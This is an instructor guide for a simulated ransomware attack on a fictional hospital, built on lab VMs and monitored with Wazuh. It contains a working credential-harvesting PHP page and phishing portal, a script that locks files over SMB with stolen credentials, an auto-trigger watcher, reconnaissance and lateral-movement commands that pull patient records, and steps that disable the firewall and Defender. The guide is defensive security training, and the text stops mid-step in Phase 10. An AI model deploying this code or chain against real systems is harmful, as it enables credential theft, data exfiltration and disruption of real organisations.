ST. HERA'S HOSPITAL
RANSOMWARE SIMULATION
PROJECT ROADMAP & INSTRUCTOR GUIDE



LAB ENVIRONMENT
Kali Linux
192.168.0.218 — Attacker VM (Apache, PHP, Python, smbclient, nmap)
WIN-NURSE-WS
192.168.0.236 — Phishing victim, Windows 11, Wazuh Agent
WIN-HOSPITAL-SRV
192.168.0.237 — Patient data server, Windows Server, Wazuh Agent, SMB Shares
Wazuh OVA
192.168.0.177 — SIEM Manager, Indexer, Dashboard
Domain
stherashospital.org → 192.168.0.218 (Kali Apache)
Credentials
n.rivera / Summer2026! (fictional nurse Nicole Rivera)


FICTIONAL LAB — All hospital names, patient data, and credentials are completely simulated for educational use only.

P1
PHASE 1: NETWORK SETUP & VM CONFIGURATION


Step 1
Verify all VMs can reach each other on the bridged network
◆ Description
Before anything else, confirm all four VMs are on the same network and can communicate. All VMs need both a NAT adapter and a Bridged adapter. The bridged adapter gives them a 192.168.0.x address on your physical network.
◆ Commands / Details
# On Kali Linux:
ping 192.168.0.236
ping 192.168.0.237
ping 192.168.0.177
 
# On each Windows VM (PowerShell):
ipconfig
ping 192.168.0.218

◆ Expected Outcome
0% packet loss on all pings. Each VM shows a 192.168.0.x address on Ethernet 2 (bridged adapter).
◆ Notes / Troubleshooting
If a VM shows 169.254.x.x — it failed to get a DHCP address. Set a static IP manually (see Step 2).
In VirtualBox: Settings → Network → make sure Adapter 2 is Bridged and shows your physical WiFi/Ethernet card.

📷  SCREENSHOT
Show ipconfig output on each Windows VM and successful ping results on Kali
[ _________________________________ paste screenshot here _________________________________ ]


Step 2
Set static IPs on WIN-NURSE-WORKSTATION and WIN-HOSPITAL-SERVER
◆ Description
Static IPs prevent the VMs from getting different addresses after a reboot, which would break all the configured rules, scripts, and connections.
◆ Commands / Details
# WIN-NURSE-WORKSTATION (PowerShell as Administrator):
Remove-NetIPAddress -InterfaceAlias "Ethernet 2" -Confirm:$false
Remove-NetRoute -InterfaceAlias "Ethernet 2" -Confirm:$false
New-NetIPAddress -InterfaceAlias "Ethernet 2" -IPAddress 192.168.0.236 -PrefixLength 24 -DefaultGateway 192.168.0.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet 2" -ServerAddresses 8.8.8.8
 
# WIN-HOSPITAL-SERVER (PowerShell as Administrator):
Remove-NetIPAddress -InterfaceAlias "Ethernet 2" -Confirm:$false
Remove-NetRoute -InterfaceAlias "Ethernet 2" -Confirm:$false
New-NetIPAddress -InterfaceAlias "Ethernet 2" -IPAddress 192.168.0.237 -PrefixLength 24 -DefaultGateway 192.168.0.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet 2" -ServerAddresses 8.8.8.8

◆ Expected Outcome
ipconfig shows 192.168.0.236 on nurse workstation and 192.168.0.237 on hospital server. Both persist after reboot.
◆ Notes / Troubleshooting
Run Remove-NetIPAddress first or you will get 'DefaultGateway already exists' error.
Check adapter name with: Get-NetAdapter — use the exact Name shown.

📷  SCREENSHOT
Show ipconfig on both VMs confirming static IPs
[ _________________________________ paste screenshot here _________________________________ ]


Step 3
Rename both Windows VMs to their lab names
◆ Description
Renaming the computers ensures Wazuh agents register with the correct hostname, and makes Nmap/nbtscan output show meaningful names during the demo.
◆ Commands / Details
# WIN-NURSE-WORKSTATION:
Rename-Computer -NewName "WIN-NURSE-WORKSTATION" -Force
Restart-Computer -Force
 
# WIN-HOSPITAL-SERVER:
Rename-Computer -NewName "WIN-HOSPITAL-SERVER" -Force
Restart-Computer -Force
 
# Verify after reboot:
hostname

◆ Expected Outcome
hostname returns WIN-NURSE-WORKSTATION and WIN-HOSPITAL-SERVER respectively.
◆ Notes / Troubleshooting
BitLocker may prompt for recovery key on cloned VMs after rename/reboot. Key found via manage-bde -protectors -get C: on the original VM.

📷  SCREENSHOT
Show hostname output on both VMs
[ _________________________________ paste screenshot here _________________________________ ]






P2
PHASE 2: WINDOWS SERVER SETUP — ACCOUNTS, FILES & SHARES


Step 1
Create fictional nurse account n.rivera on both Windows VMs
◆ Description
Nicole Rivera is the fictional nurse whose credentials will be stolen during the phishing simulation. This account must exist on both VMs since the attacker will use her credentials to authenticate to the hospital server.
◆ Commands / Details
# Run on BOTH VMs (PowerShell Admin):
New-LocalUser -Name "n.rivera" -Password (ConvertTo-SecureString "Summer2026!" -AsPlainText -Force) -FullName "Nicole Rivera" -Description "Registered Nurse - 3 West"
Add-LocalGroupMember -Group "Users" -Member "n.rivera"
 
# Verify:
Get-LocalUser n.rivera

◆ Expected Outcome
Get-LocalUser n.rivera shows: Enabled: True, FullName: Nicole Rivera
◆ Notes / Troubleshooting
Account name must be exactly n.rivera (lowercase). Password: Summer2026! (capital S, exclamation mark). These credentials are used in all smbclient commands.

📷  SCREENSHOT
Show Get-LocalUser n.rivera output confirming account exists
[ _________________________________ paste screenshot here _________________________________ ]


Step 2
Create hospital file structure and patient records on WIN-HOSPITAL-SERVER
◆ Description
The hospital server holds the patient records that the attacker will discover and exfiltrate. Three fictional patients across three departments — Cardiology, Oncology, and Radiology.
◆ Commands / Details
# Create directory structure:
New-Item -ItemType Directory -Path "C:\HospitalServer\PatientRecords\Cardiology" -Force
New-Item -ItemType Directory -Path "C:\HospitalServer\PatientRecords\Oncology" -Force
New-Item -ItemType Directory -Path "C:\HospitalServer\PatientRecords\Radiology" -Force
New-Item -ItemType Directory -Path "C:\HospitalServer\RansomwareDemo" -Force
 
# Create fictional patient records:
"Patient: John Doe | MRN: 0048291 | DOB: 03/14/1982 | Diagnosis: Hypertension | Physician: Dr. Emily Carter" | Out-File "C:\HospitalServer\PatientRecords\Cardiology\JohnDoe_chart.txt"
 
"Patient: Maria Vasquez | MRN: 0053842 | DOB: 07/22/1975 | Diagnosis: Stage II Lymphoma | Physician: Dr. Lisa Brandt" | Out-File "C:\HospitalServer\PatientRecords\Oncology\MariaVasquez_chart.txt"
 
"Patient: Robert Chang | MRN: 0061103 | DOB: 11/05/1990 | Scan: CT Chest | Ordered by: Dr. Emily Carter" | Out-File "C:\HospitalServer\PatientRecords\Radiology\RobertChang_scan.txt"
 
# Create demo files for ransomware:
"Disposable demo file 1" | Out-File "C:\HospitalServer\RansomwareDemo\demo_file1.txt"
"Disposable demo file 2" | Out-File "C:\HospitalServer\RansomwareDemo\demo_file2.txt"
"Disposable demo file 3" | Out-File "C:\HospitalServer\RansomwareDemo\demo_file3.txt"

◆ Expected Outcome
Get-ChildItem C:\HospitalServer\PatientRecords -Recurse shows 3 patient files across 3 departments. RansomwareDemo has 3 demo .txt files.
◆ Notes / Troubleshooting
All patient data is completely fictional — created for educational purposes only.

📷  SCREENSHOT
Show Get-ChildItem C:\HospitalServer -Recurse showing full folder structure
[ _________________________________ paste screenshot here _________________________________ ]


Step 3
Create SMB shares on both Windows VMs
◆ Description
SMB shares allow smbclient on Kali to connect using Nicole's stolen credentials. The hospital server shares PatientRecords (the real target) and RansomwareDemo (the simulation target). The nurse workstation shares only RansomwareDemo.
◆ Commands / Details
# WIN-HOSPITAL-SERVER:
New-SmbShare -Name "PatientRecords" -Path "C:\HospitalServer\PatientRecords" -Description "Hospital Patient Records"
New-SmbShare -Name "RansomwareDemo" -Path "C:\HospitalServer\RansomwareDemo" -Description "Ransomware Demo Folder"
Grant-SmbShareAccess -Name "PatientRecords" -AccountName "n.rivera" -AccessRight Read -Force
Grant-SmbShareAccess -Name "RansomwareDemo" -AccountName "n.rivera" -AccessRight Full -Force
 
# WIN-NURSE-WORKSTATION:
New-Item -ItemType Directory -Path "C:\Users\n.rivera\Desktop\RansomwareDemo" -Force
New-SmbShare -Name "RansomwareDemo" -Path "C:\Users\n.rivera\Desktop\RansomwareDemo"
Grant-SmbShareAccess -Name "RansomwareDemo" -AccountName "n.rivera" -AccessRight Full -Force
"File 1" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file1.txt"
"File 2" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file2.txt"
"File 3" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file3.txt"
 
# Verify from Kali:
smbclient -L //192.168.0.237 -U n.rivera%Summer2026!

◆ Expected Outcome
smbclient -L shows PatientRecords and RansomwareDemo shares on hospital server. Get-SmbShare on both VMs shows correct paths.
◆ Notes / Troubleshooting
If shares already exist from a clone: Remove-SmbShare -Name 'ShareName' -Force then recreate pointing to new paths.

📷  SCREENSHOT
Show smbclient -L output from Kali listing the hospital server shares
[ _________________________________ paste screenshot here _________________________________ ]


Step 4
Disable firewall and enable audit policies on both Windows VMs
◆ Description
The Windows Firewall blocks SMB connections from Kali. Audit policies are required for Windows to generate the Security Event Log events (4624, 4625, 4663, 5145) that Wazuh needs to detect the attack.
◆ Commands / Details
# Run on BOTH VMs (PowerShell Admin):
netsh advfirewall set allprofiles state off
 
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"File Share" /success:enable /failure:enable
auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable
auditpol /set /subcategory:"File System" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Filtering Platform Connection" /success:enable /failure:enable

◆ Expected Outcome
netsh advfirewall show allprofiles shows State: OFF for all profiles on both VMs.
◆ Notes / Troubleshooting
Audit policies are NOT persistent through group policy on standalone machines — recheck after reboot if events stop flowing.

📷  SCREENSHOT
Show netsh advfirewall show allprofiles confirming firewall is OFF
[ _________________________________ paste screenshot here _________________________________ ]


Step 5
Add SACL (System Access Control List) auditing to monitored folders
◆ Description
Audit policy alone does NOT generate Event 4663 (file access events). The specific folders must also have SACL auditing enabled. Without this step, Wazuh will never see file access alerts even with all audit policies set.
◆ Commands / Details
# On WIN-HOSPITAL-SERVER — File Explorer:
# 1. Right-click C:\HospitalServer\PatientRecords → Properties
# 2. Security tab → Advanced → Auditing tab
# 3. Click Continue → Add → Select principal: Everyone → OK
# 4. Type: Success
# 5. Applies to: This folder, subfolders and files
# 6. Check: Read & execute, List folder, Read, Write, Delete
# 7. OK → Apply → OK
# Repeat for C:\HospitalServer\RansomwareDemo
 
# PowerShell alternative:
$acl = Get-Acl "C:\HospitalServer\PatientRecords"
$rule = New-Object System.Security.AccessControl.FileSystemAuditRule("Everyone","ReadData,WriteData,Delete","ContainerInherit,ObjectInherit","None","Success")
$acl.SetAuditRule($rule)
Set-Acl "C:\HospitalServer\PatientRecords" $acl

◆ Expected Outcome
After accessing a file via smbclient, Event ID 4663 appears in Windows Event Viewer → Security log.
◆ Notes / Troubleshooting
This is one of the most commonly missed steps. If Event 4663 is missing in Wazuh alerts, the SACL is almost certainly not set.

📷  SCREENSHOT
Show Windows Security Event Log with Event 4663 after file access
[ _________________________________ paste screenshot here _________________________________ ]






P3
PHASE 3: PHISHING PORTAL SETUP — APACHE, PHP & HTML


Step 1
Configure Apache web server on Kali for stherashospital.org
◆ Description
The phishing portal is hosted on Kali's Apache web server under the fictional domain stherashospital.org. The /etc/hosts file on Kali maps this domain to localhost so the nurse workstation browser can reach it.
◆ Commands / Details
sudo apt install apache2 php -y
sudo a2enmod rewrite
sudo mkdir -p /var/www/html/heras
sudo mkdir -p /var/www/logs
sudo chmod 777 /var/www/logs
 
# Add to /etc/hosts on Kali:
echo "127.0.0.1 stherashospital.org" | sudo tee -a /etc/hosts
 
# On Windows (hosts file for nurse workstation):
# C:\Windows\System32\drivers\etc\hosts
# Add line: 192.168.0.218  stherashospital.org
 
sudo systemctl start apache2
sudo systemctl enable apache2

◆ Expected Outcome
curl http://stherashospital.org returns HTML. On nurse workstation browser, http://stherashospital.org/heras/email.html loads.
◆ Notes / Troubleshooting
If port 80 is in use: sudo lsof -i :80 — kill the conflicting process then restart Apache.

📷  SCREENSHOT
Show the phishing email page (email.html) loaded in the nurse workstation's browser
[ _________________________________ paste screenshot here _________________________________ ]


Step 2
Deploy all phishing portal HTML files
◆ Description
The phishing simulation uses 5 HTML/PHP files that create a convincing fake hospital experience. The victim sees a realistic email, enters credentials on a fake portal, then sees a success page and fake hospital dashboard — completely unaware the attack is running.
◆ Commands / Details
# Files deployed to /var/www/html/heras/:
# email.html    — Fake Outlook-style inbox with urgent IT Security email
# verify.html   — Fake credential portal (form POSTs to login.php)
# login.php     — Captures credentials, writes logs, triggers watcher
# updated.html  — "Account Verified" success page with spinner
# dashboard.html — Fake hospital EMR dashboard with sub-pages
 
# Victim flow:
# email.html → [click Verify] → verify.html → [submit creds]
# → login.php [credentials captured] → updated.html [success]
# → dashboard.html [fake hospital system]

◆ Expected Outcome
Full victim flow works: email → verify → success → dashboard. Each page loads correctly.
◆ Notes / Troubleshooting
The form in verify.html must have action='login.php' and method='POST'. Check with: cat /var/www/html/heras/verify.html | grep action

📷  SCREENSHOT
Show all 4 pages: email.html, verify.html, updated.html, dashboard.html
[ _________________________________ paste screenshot here _________________________________ ]


Step 3
Configure login.php to capture credentials and write to logs
◆ Description
login.php is the core of the phishing capture — it grabs the submitted username and password, logs them with timestamp and IP, and redirects the victim to the success page. The access.log entry is what the watcher.sh monitors to trigger the ransomware simulation.
◆ Commands / Details
# Complete login.php content:
<?php
date_default_timezone_set('UTC');
$user  = isset($_POST['username']) ? $_POST['username'] : '';
$pass  = isset($_POST['password']) ? $_POST['password'] : '';
$ip    = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$time  = date("Y-m-d H:i:s");
 
$cred_entry   = "[$time] IP: $ip | USER: $user | PASS: $pass | AGENT: $agent\n";
$access_entry = "[$time] Credential submission from $ip\n";
 
file_put_contents("/var/www/logs/creds.txt",  $cred_entry,   FILE_APPEND);
file_put_contents("/var/www/logs/access.log", $access_entry, FILE_APPEND);
 
header("Location: updated.html");
exit();
?>

◆ Expected Outcome
After submitting credentials on nurse browser: cat /var/www/logs/creds.txt shows [timestamp] IP: 192.168.0.236 | USER: n.rivera | PASS: Summer2026!
◆ Notes / Troubleshooting
/var/www/logs/ must have 777 permissions: chmod 777 /var/www/logs/

📷  SCREENSHOT
Show creds.txt on Kali terminal with captured credentials after test submission
[ _________________________________ paste screenshot here _________________________________ ]






P4
PHASE 4: RANSOMWARE SIMULATION — SCRIPTS & AUTOMATION


Step 1
Create ransomware_sim.py — the main simulation script
◆ Description
ransomware_sim.py is the core of the simulation. It connects to both Windows VMs via smbclient and renames demo files to .locked, uploads the ransom note, waits 10 seconds (so victim sees the dashboard), then stops Apache. Each file rename is a SEPARATE smbclient call — running them together in one session causes only the first to succeed.
◆ Commands / Details
# Key configuration block at top of ransomware_sim.py:
WINDOWS_IPS = [
    "192.168.0.236",   # WIN-NURSE-WORKSTATION
    "192.168.0.237"    # WIN-HOSPITAL-SERVER
]
SMB_SHARE        = "RansomwareDemo"
SMB_USER         = "n.rivera"
SMB_PASS         = "Summer2026!"
RANSOM_NOTE_PATH = "/opt/ransomware-sim/ransom_note.txt"
DEMO_FILES       = ["demo_file1.txt","demo_file2.txt","demo_file3.txt"]
 
# Critical pattern — each file in its OWN smbclient call:
for f in DEMO_FILES:
    cmd = f'rename "{f}" "{f}.locked"'
    subprocess.run(
        f'/usr/bin/smbclient //{ip}/{SMB_SHARE} -U {SMB_USER}%{SMB_PASS} -c \'{cmd}\'',
        shell=True, capture_output=True, text=True
    )
 
# After locking files: time.sleep(10) then systemctl stop apache2

◆ Expected Outcome
sudo python3 /opt/ransomware-sim/ransomware_sim.py runs successfully. All 3 files on BOTH VMs renamed to .locked. Ransom note present on both. Apache stops after 10 seconds.
◆ Notes / Troubleshooting
If files don't lock: check smbclient path with 'which smbclient'. Must use full path /usr/bin/smbclient in subprocess calls with shell=True.

📷  SCREENSHOT
Show both Windows VM RansomwareDemo folders with .locked files and ransom_note.txt
[ _________________________________ paste screenshot here _________________________________ ]


Step 2
Create watcher.sh — automatic trigger from credential capture
◆ Description
watcher.sh monitors the Apache access.log in a loop. When it detects a new 'Credential submission' line it fires ransomware_sim.py automatically. This is what makes the demo fully automated — the nurse submits credentials and the entire hospital locks down without the attacker doing anything else.
◆ Commands / Details
#!/bin/bash
LOG="/opt/ransomware-sim/wrapper.log"
ACCESSLOG="/var/www/logs/access.log"
 
echo "[$(date)] Watcher started." >> "$LOG"
 
# Start from current file size — ignore existing entries
LASTSIZE=$(wc -c < "$ACCESSLOG" 2>/dev/null || echo 0)
 
while true; do
    CURRENTSIZE=$(wc -c < "$ACCESSLOG" 2>/dev/null || echo 0)
    if [ "$CURRENTSIZE" -gt "$LASTSIZE" ]; then
        NEWCONTENT=$(tail -c +$((LASTSIZE + 1)) "$ACCESSLOG")
        if echo "$NEWCONTENT" | grep -q "Credential submission"; then
            echo "[$(date)] Credential detected — firing simulation!" >> "$LOG"
            python3 /opt/ransomware-sim/ransomware_sim.py
        fi
        LASTSIZE=$CURRENTSIZE
    fi
    sleep 1
done

◆ Expected Outcome
sudo bash /opt/ransomware-sim/watcher.sh runs and waits silently. After credentials are submitted via browser, it automatically fires the ransomware simulation within 1 second.
◆ Notes / Troubleshooting
IMPORTANT: Clear access.log BEFORE starting watcher or it may auto-trigger from previous runs: > /var/www/logs/access.log

📷  SCREENSHOT
Show watcher.sh terminal after it detects and fires the simulation
[ _________________________________ paste screenshot here _________________________________ ]


Step 3
Create restore.sh and test full reset cycle
◆ Description
restore.sh reverses everything — renames .locked files back to .txt, removes ransom notes from both VMs, and starts Apache again. This must be run before every demo to reset to a clean state.
◆ Commands / Details
# restore.sh content:
#!/bin/bash
python3 /opt/ransomware-sim/ransomware_sim.py --restore
 
# Run restore:
sudo python3 /opt/ransomware-sim/ransomware_sim.py --restore
 
# Manually restore demo files on Windows if needed:
# WIN-NURSE-WORKSTATION:
Remove-Item "C:\Users\n.rivera\Desktop\RansomwareDemo\*.locked" -Force -ErrorAction SilentlyContinue
"Disposable demo file 1" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file1.txt"
"Disposable demo file 2" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file2.txt"
"Disposable demo file 3" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file3.txt"
 
# WIN-HOSPITAL-SERVER: (same but C:\HospitalServer\RansomwareDemo\)

◆ Expected Outcome
All .locked files renamed back to .txt on both VMs. Ransom notes removed. Apache running. http://stherashospital.org/email.html accessible.
📷  SCREENSHOT
Show both Windows VM RansomwareDemo folders showing clean .txt files after restore
[ _________________________________ paste screenshot here _________________________________ ]






P5
PHASE 5: NETWORK RECON — DISCOVERY & ENUMERATION


Step 1
Run ARP scan and nbtscan to discover hosts and hostnames
◆ Description
After capturing credentials, the attacker runs recon to discover what else is on the network. ARP scan finds live hosts, nbtscan reveals their NetBIOS hostnames. This is the moment the attacker discovers the hospital server exists.
◆ Commands / Details
# ARP scan — find all live hosts:
sudo arp-scan --interface=eth1 --localnet
 
# Find correct interface if eth1 doesn't work:
ip a  # look for the interface with 192.168.0.218
 
# NetBIOS hostname discovery:
sudo nbtscan 192.168.0.0/24
 
# Expected output:
# 192.168.0.236  WIN-NURSE-WORKSTATION
# 192.168.0.237  WIN-HOSPITAL-SERVER

◆ Expected Outcome
Both Windows VMs visible in ARP scan and nbtscan with correct hostnames.
◆ Notes / Troubleshooting
MITRE ATT&CK: T1018 — Remote System Discovery, T1046 — Network Service Discovery
If nbtscan not installed: sudo apt install nbtscan -y

📷  SCREENSHOT
Show nbtscan output revealing both WIN-NURSE-WORKSTATION and WIN-HOSPITAL-SERVER
[ _________________________________ paste screenshot here _________________________________ ]


Step 2
Run Nmap service scan to identify open ports and services
◆ Description
Nmap reveals that port 445 (SMB) is open on the hospital server — confirming the attacker can attempt to use Nicole's stolen credentials against it.
◆ Commands / Details
# Full service/version scan:
nmap -sV -sC 192.168.0.236 192.168.0.237
 
# Save output:
nmap -sV -sC 192.168.0.236 192.168.0.237 -oN ~/nmap-scan.txt
 
# SMB specific:
nmap -p 445 --script smb-security-mode 192.168.0.237

◆ Expected Outcome
Port 445/tcp open on hospital server. Service: microsoft-ds. Confirms SMB accessible for lateral movement.
◆ Notes / Troubleshooting
MITRE: T1046 — Network Service Discovery

📷  SCREENSHOT
Show nmap output with port 445 open on WIN-HOSPITAL-SERVER
[ _________________________________ paste screenshot here _________________________________ ]






P6
PHASE 6: SMB LATERAL MOVEMENT & DATA EXFILTRATION


Step 1
Use stolen credentials to access hospital server via SMB
◆ Description
This is the lateral movement step — using Nicole's stolen credentials (meant for the hospital portal) to authenticate directly to the file server. No exploit needed. Just credential reuse.
◆ Commands / Details
# List shares on hospital server:
smbclient -L //192.168.0.237 -U n.rivera%Summer2026!
 
# Connect to PatientRecords:
smbclient //192.168.0.237/PatientRecords -U n.rivera%Summer2026!
 
# Inside smbclient:
ls
cd Cardiology
ls
get JohnDoe_chart.txt
exit
 
# View stolen patient record on Kali:
cat ~/JohnDoe_chart.txt

◆ Expected Outcome
JohnDoe_chart.txt contents visible on Kali. Confirms successful lateral movement and data exfiltration.
◆ Notes / Troubleshooting
MITRE: T1078 — Valid Accounts, T1039 — Data from Network Shared Drive
This is the HIPAA breach moment of the simulation.

📷  SCREENSHOT
Show smbclient session on Kali with ls output and successful file download
[ _________________________________ paste screenshot here _________________________________ ]






P7
PHASE 7: FULL AUTOMATED DEMO RUN


Step 1
Pre-demo reset checklist
◆ Description
Run this complete checklist before EVERY demo run. Skipping any step will cause the demo to fail or behave unexpectedly.
◆ Commands / Details
# === KALI ===
> /var/www/logs/creds.txt
> /var/www/logs/access.log
> /opt/ransomware-sim/wrapper.log
sudo python3 /opt/ransomware-sim/ransomware_sim.py --restore
 
# === WIN-NURSE-WORKSTATION ===
Remove-Item "C:\Users\n.rivera\Desktop\RansomwareDemo\*.locked" -Force -EA SilentlyContinue
Remove-Item "C:\Users\n.rivera\Desktop\RansomwareDemo\ransom_note.txt" -Force -EA SilentlyContinue
"File 1" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file1.txt"
"File 2" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file2.txt"
"File 3" | Out-File "C:\Users\n.rivera\Desktop\RansomwareDemo\demo_file3.txt"
 
# === WIN-HOSPITAL-SERVER ===
Remove-Item "C:\HospitalServer\RansomwareDemo\*.locked" -Force -EA SilentlyContinue
Remove-Item "C:\HospitalServer\RansomwareDemo\ransom_note.txt" -Force -EA SilentlyContinue
"File 1" | Out-File "C:\HospitalServer\RansomwareDemo\demo_file1.txt"
"File 2" | Out-File "C:\HospitalServer\RansomwareDemo\demo_file2.txt"
"File 3" | Out-File "C:\HospitalServer\RansomwareDemo\demo_file3.txt"

◆ Expected Outcome
All logs empty. All demo files restored as .txt on both VMs. Portal accessible at http://stherashospital.org/email.html
◆ Notes / Troubleshooting
Run this before EVERY demo without exception.

📷  SCREENSHOT
Show clean Get-ChildItem on both VMs confirming .txt files only
[ _________________________________ paste screenshot here _________________________________ ]


Step 2
Full demo run — complete attack chain
◆ Description
The complete end-to-end demonstration. Keep multiple terminals open on Kali during the demo to show the attack from the attacker's perspective while Wazuh shows it from the defender's perspective.
◆ Commands / Details
# KALI TERMINAL 1 — watch credentials land:
tail -f /var/www/logs/creds.txt
 
# KALI TERMINAL 2 — start watcher:
sudo bash /opt/ransomware-sim/watcher.sh
 
# DEMO SEQUENCE:
# 1. Open nurse browser: http://stherashospital.org/email.html
# 2. Show phishing email → click Verify Account Credentials
# 3. Enter n.rivera / Summer2026! → click Submit
# 4. Watch Terminal 1 — credentials appear instantly
# 5. Watch Terminal 2 — watcher fires simulation automatically
# 6. Run recon: sudo nbtscan 192.168.0.0/24
# 7. Run recon: nmap -sV 192.168.0.236 192.168.0.237
# 8. Pivot: smbclient //192.168.0.237/PatientRecords -U n.rivera%Summer2026!
# 9. Inside: ls → cd Cardiology → get JohnDoe_chart.txt → exit
# 10. Show both Windows folders — .locked files and ransom_note.txt
# 11. Try portal — site can't be reached (Apache stopped after 10s)
# 12. Show Wazuh dashboard — all panels updated

◆ Expected Outcome
Complete attack chain visible. Credential capture → recon → lateral movement → ransomware on both VMs → hospital portal unreachable → Wazuh dashboard showing all alerts.
◆ Notes / Troubleshooting
Keep restore script ready for immediate reset: sudo python3 /opt/ransomware-sim/ransomware_sim.py --restore

📷  SCREENSHOT
Show Wazuh CYBERLAB Security Monitor dashboard with all panels showing alert counts
[ _________________________________ paste screenshot here _________________________________ ]






P8
PHASE 8: WAZUH OVA SETUP & CONFIGURATION


Step 1
Import Wazuh OVA and configure network in VirtualBox
◆ Description
The Wazuh OVA is a pre-built virtual appliance containing Wazuh Manager, Indexer, and Dashboard. It must be on the same bridged network as the Windows VMs to receive agent logs.
◆ Commands / Details
# VirtualBox:
# 1. File → Import Appliance → select Wazuh OVA
# 2. Complete import
# 3. Settings → Network → Adapter 1: NAT, Adapter 2: Bridged
# 4. Boot and log in: wazuh-user / wazuh
# 5. Become root: su root (password: wazuh)
# 6. Check IP:
ip -br address
# Should show 192.168.0.177 on bridged adapter

◆ Expected Outcome
Wazuh VM accessible at https://192.168.0.177 in browser. Login: admin / admin. Wazuh dashboard loads.
◆ Notes / Troubleshooting
If Wazuh fails to start after import:
systemctl restart wazuh-indexer
sleep 30
systemctl restart wazuh-manager
systemctl restart wazuh-dashboard
 
Accept the self-signed certificate warning in the browser — expected in a lab environment.

📷  SCREENSHOT
Show Wazuh dashboard login page and home screen after login
[ _________________________________ paste screenshot here _________________________________ ]


Step 2
Create CYBERLAB group with shared agent configuration
◆ Description
The CYBERLAB group configuration pushes FIM monitoring paths and event log collection settings to all agents in the group. Both Windows agents join this group so they both monitor the same paths and forward the same event logs.
◆ Commands / Details
# Dashboard → Management → Groups → Add new group
# Name: CYBERLAB
 
# Edit group configuration (paste this XML):
<agent_config>
  <syscheck>
    <disabled>no</disabled>
    <frequency>60</frequency>
    <directories check_all="yes" realtime="yes" report_changes="yes">C:\HospitalServer\PatientRecords</directories>
    <directories check_all="yes" realtime="yes" report_changes="yes">C:\HospitalServer\RansomwareDemo</directories>
  </syscheck>
  <localfile>
    <log_format>eventchannel</log_format>
    <location>Security</location>
  </localfile>
  <localfile>
    <log_format>eventchannel</log_format>
    <location>System</location>
  </localfile>
  <localfile>
    <log_format>eventchannel</log_format>
    <location>Application</location>
  </localfile>
  <localfile>
    <log_format>eventchannel</log_format>
    <location>Microsoft-Windows-SMBServer/Security</location>
  </localfile>
</agent_config>

◆ Expected Outcome
CYBERLAB group visible in Management → Groups. Group configuration saved.
◆ Notes / Troubleshooting
After agents join the group, check their ossec.log for 'Log file Security is duplicated' warning — if present, remove duplicate localfile entries from the local ossec.conf on that VM.

📷  SCREENSHOT
Show CYBERLAB group configuration in Wazuh dashboard
[ _________________________________ paste screenshot here _________________________________ ]






P9
PHASE 9: WAZUH AGENT INSTALLATION ON WINDOWS VMS


Step 1
Install Wazuh agent on WIN-NURSE-WORKSTATION
◆ Description
The Wazuh agent runs on each Windows VM and forwards event logs and FIM data to the Wazuh manager. Install from the Wazuh dashboard's deploy wizard to get the correct version and auto-configured manager address.
◆ Commands / Details
# Wazuh Dashboard:
# 1. Agents → Deploy New Agent
# 2. OS: Windows, Manager IP: 192.168.0.177
# 3. Agent Name: WIN-NURSE-WORKSTATION
# 4. Copy generated PowerShell command
# 5. Run in PowerShell Admin on WIN-NURSE-WORKSTATION
 
# After install:
NET START WazuhSvc
Get-Service WazuhSvc  # Should show: Running
 
# Add to CYBERLAB group:
# Dashboard → Agents → WIN-NURSE-WORKSTATION → Groups → Add → CYBERLAB → Save
 
# Restart agent to pull group config:
NET STOP WazuhSvc
NET START WazuhSvc

◆ Expected Outcome
Agents list shows WIN-NURSE-WORKSTATION: Active, IP 192.168.0.236, Group: CYBERLAB
📷  SCREENSHOT
Show Wazuh Agents list with WIN-NURSE-WORKSTATION showing Active status
[ _________________________________ paste screenshot here _________________________________ ]


Step 2
Install Wazuh agent on WIN-HOSPITAL-SERVER and fix duplicate log issue
◆ Description
Same process as the nurse workstation but critical: after joining the CYBERLAB group, check for duplicate Security log warnings. The group config already provides localfile entries, so if the local ossec.conf also has them, Wazuh drops events from the duplicate source.
◆ Commands / Details
# Install same as Step 1 but with:
# Agent Name: WIN-HOSPITAL-SERVER
 
# After joining CYBERLAB group — check for duplicates:
type "C:\Program Files (x86)\ossec-agent\ossec.conf" | findstr /i "security"
# Should return ONLY ONE result. If two appear, remove duplicates.
 
# Remove EventID exclusions (critical):
$path = "C:\Program Files (x86)\ossec-agent\ossec.conf"
$text = [System.IO.File]::ReadAllText($path)
$eventIds = 4663, 5145, 5156, 5152
foreach ($eventId in $eventIds) {
    $text = [regex]::Replace($text, "(?i)\s+and\s+EventID\s*!=\s*$eventId\b", "")
}
[System.IO.File]::WriteAllText($path, $text)
NET STOP WazuhSvc
NET START WazuhSvc
 
# Disable Windows Defender real-time protection:
Set-MpPreference -DisableRealtimeMonitoring $true

◆ Expected Outcome
Both agents Active. No 'Log file duplicated' warnings in ossec.log. Events 4663 and 5145 appear in Wazuh alerts after file access.
◆ Notes / Troubleshooting
If hospital server still not logging: disable Windows Defender real-time protection. Defender can block Wazuh from reading Security event logs.

📷  SCREENSHOT
Show both agents Active in Wazuh Agents list
[ _________________________________ paste screenshot here _________________________________ ]






P10
PHASE 10: CDB THREAT INTELLIGENCE LISTS


Step 1
Create and deploy CDB allowlists and blocklists
◆ Description
CDB lists allow Wazuh rules to perform IP-based lookups — flagging Kali's IP as a suspicious destination and whitelisting the nurse workstation as a trusted SMB source. This makes rules more intelligent and realistic.
◆ Commands / Details
# On Kali — create list files:
echo "192.168.0.218:simulated-phishing-portal" > ~/ocblue_suspicious_destinations
echo "192.168.0.236:approved-hospital-system" > ~/ocblue_trusted_smb_sources
 
# Push to Apache:
sudo cp ~/ocblue_suspicious_destinations /var/www/html/
